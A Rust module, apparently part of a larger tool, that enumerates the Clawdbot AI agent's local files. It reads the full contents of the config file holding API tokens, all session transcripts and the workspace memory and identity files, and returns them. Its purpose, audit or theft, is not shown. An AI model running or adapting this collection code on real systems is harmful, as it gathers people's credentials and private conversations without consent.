//!
//! Clawdbot enumeration - discovers config files and workspace data.
//!

use anyhow::Result;
use common::{SessionItem, ConfigItem};
use std::fs;

/// Data discovered during enumeration.
pub struct EnumerationData {
    pub config_items: Vec<ConfigItem>,
    pub sessions: Vec<SessionItem>,
    pub project_paths: Vec<String>,
}

/// Enumerate Clawdbot configuration and workspace files.
pub fn enumerate() -> Result<EnumerationData> {
    let mut config_items = Vec::new();
    let mut sessions = Vec::new();
    let project_paths = Vec::new();

    //
    // Get home directory.
    //
    let home = match dirs::home_dir() {
        Some(h) => h,
        None => return Ok(EnumerationData { config_items, sessions, project_paths }),
    };

    //
    // ~/.clawdbot/ - main config directory
    //
    let clawdbot_dir = home.join(".clawdbot");
    if clawdbot_dir.exists() {
        //
        // clawdbot.json - main config with API tokens
        //
        let config_json = clawdbot_dir.join("clawdbot.json");
        if config_json.exists() {
            if let Ok(contents) = fs::read_to_string(&config_json) {
                config_items.push(ConfigItem {
                    config_type: "main_config".to_string(),
                    path: config_json.to_string_lossy().to_string(),
                    contents: Some(contents),
                });
            }
        }

        //
        // Legacy config.yaml
        //
        let config_yaml = clawdbot_dir.join("config.yaml");
        if config_yaml.exists() {
            if let Ok(contents) = fs::read_to_string(&config_yaml) {
                config_items.push(ConfigItem {
                    config_type: "legacy_config".to_string(),
                    path: config_yaml.to_string_lossy().to_string(),
                    contents: Some(contents),
                });
            }
        }

        //
        // sessions/ - conversation logs
        //
        let sessions_dir = clawdbot_dir.join("sessions");
        if sessions_dir.exists() {
            if let Ok(entries) = fs::read_dir(&sessions_dir) {
                for entry in entries.flatten() {
                    let path = entry.path();
                    if path.is_file() {
                        let session_id = path
                            .file_name()
                            .map(|n| n.to_string_lossy().to_string())
                            .unwrap_or_default();

                        let metadata = fs::metadata(&path).ok();
                        let last_modified = metadata
                            .and_then(|m| m.modified().ok())
                            .map(|t| {
                                let dt: chrono::DateTime<chrono::Utc> = t.into();
                                dt.to_rfc3339()
                            })
                            .unwrap_or_default();

                        //
                        // Read session transcripts for metadata extraction.
                        //
                        if let Ok(contents) = fs::read_to_string(&path) {
                            let message_count = contents.lines().filter(|l| !l.trim().is_empty()).count();

                            sessions.push(SessionItem {
                                session_id: session_id.clone(),
                                context_path: String::new(),
                                session_file: path.to_string_lossy().to_string(),
                                last_modified,
                                message_count,
                                content: Some(contents.clone()),
                            });

                            //
                            // Limit to first 50KB per session.
                            //
                            let truncated = if contents.len() > 50000 {
                                contents[..50000].to_string()
                            } else {
                                contents
                            };
                            config_items.push(ConfigItem {
                                config_type: format!("session:{}", session_id),
                                path: path.to_string_lossy().to_string(),
                                contents: Some(truncated),
                            });
                        }
                    }
                }
            }
        }
    }

    //
    // ~/clawd/ - workspace directory
    //
    let workspace_dir = home.join("clawd");
    if workspace_dir.exists() {
        //
        // Core workspace files.
        //
        let workspace_files = [
            ("memory", "MEMORY.md"),
            ("user", "USER.md"),
            ("tools", "TOOLS.md"),
            ("heartbeat", "HEARTBEAT.md"),
            ("soul", "SOUL.md"),
            ("agents", "AGENTS.md"),
            ("identity", "IDENTITY.md"),
        ];

        for (config_type, filename) in workspace_files {
            let file_path = workspace_dir.join(filename);
            if file_path.exists() {
                if let Ok(contents) = fs::read_to_string(&file_path) {
                    config_items.push(ConfigItem {
                        config_type: config_type.to_string(),
                        path: file_path.to_string_lossy().to_string(),
                        contents: Some(contents),
                    });
                }
            }
        }

        //
        // memory/ subdirectory - daily logs.
        //
        let memory_dir = workspace_dir.join("memory");
        if memory_dir.exists() {
            if let Ok(entries) = fs::read_dir(&memory_dir) {
                for entry in entries.flatten() {
                    let path = entry.path();
                    if path.is_file() && path.extension().map_or(false, |e| e == "md") {
                        if let Ok(contents) = fs::read_to_string(&path) {
                            config_items.push(ConfigItem {
                                config_type: format!("daily_memory:{}", path.file_name().unwrap_or_default().to_string_lossy()),
                                path: path.to_string_lossy().to_string(),
                                contents: Some(contents),
                            });
                        }
                    }
                }
            }
        }
    }

    Ok(EnumerationData {
        config_items,
        sessions,
        project_paths,
    })
}
